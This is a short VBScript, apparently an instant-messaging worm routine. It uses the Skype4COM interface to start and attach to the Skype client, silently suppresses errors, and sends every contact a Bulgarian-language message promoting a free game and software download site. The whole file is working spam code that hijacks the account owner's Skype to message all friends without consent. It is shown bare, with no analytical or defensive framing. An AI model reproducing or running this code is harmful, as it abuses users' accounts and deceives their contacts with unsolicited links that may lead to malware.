on error resume next

set yADAl = Wscript.CreateObject("Skype4COM.Skype", "Skype_")
yADAl.Client.Start()
yADAl.Attach()
For Each GAG In yADAl.Friends
yADAl.SendMessage GAG.handle,"vij tozi sait: www.pcgames.dir.bg ot nego moje6 da svlq6 igri i programi totalno bezplatno i bez ragistraciq!:D"
next